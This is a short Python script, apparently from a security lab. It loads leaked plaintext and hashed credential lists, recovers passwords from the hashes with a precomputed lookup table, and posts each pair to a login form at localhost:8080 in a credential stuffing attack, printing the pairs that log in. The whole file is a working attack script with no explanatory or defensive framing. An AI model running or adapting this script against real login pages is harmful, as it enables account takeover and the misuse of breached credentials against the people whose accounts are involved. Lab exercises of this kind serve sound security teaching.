from csv import reader
from requests import post, codes

LOGIN_URL = "http://localhost:8080/login"

PLAINTEXT_BREACH_PATH = "app/scripts/breaches/plaintext_breach.csv"
HASHED_BREACH_PATH = "app/scripts/breaches/hashed_breach.csv"
LOOKUP_TABLE_PATH = "./lookup.csv"

def load_breach(fp):
    with open(fp) as f:
        r = reader(f, delimiter=' ')
        header = next(r)
        assert(header[0] == 'username')
        return list(r)

def load_lookup(fp):
    hashtable = {}
    with open(fp) as f:
        r = reader(f)
        header = next(r)
        for row in r:
            hashtable[row[0]]=row[1]
    return hashtable


def attempt_login(username, password):
    response = post(LOGIN_URL,
                    data={
                        "username": username,
                        "password": password,
                        "login": "Login",
                    })
    return response.status_code == codes.ok

def credential_stuffing_attack(creds):
    success_creds = []
    for cred_pair in creds:
        if len(cred_pair) != 2:
            continue
        uname = cred_pair[0]
        pswd = cred_pair[1]
        login_succ = attempt_login(uname, pswd)
        if login_succ:
            success_creds.append(cred_pair)
            print(cred_pair)

def lookup_pswd_in_hashtable(creds, hashtable):
    deciphered_creds = []
    for cred_pair in creds:
        uname = cred_pair[0]
        h = cred_pair[1]
        if h in hashtable:
            deciphered_creds.append([uname,hashtable[h]])
            #print(uname,':',h,':',hashtable[h])
    return deciphered_creds

def main():
    creds = load_breach(PLAINTEXT_BREACH_PATH)
    #credential_stuffing_attack(creds)
    
    creds2 = load_breach(HASHED_BREACH_PATH)
    hashtable = load_lookup(LOOKUP_TABLE_PATH)
    #print(hashtable)
    creds3=lookup_pswd_in_hashtable(creds2, hashtable)

    credential_stuffing_attack(creds + creds3)

if __name__ == "__main__":
    main()
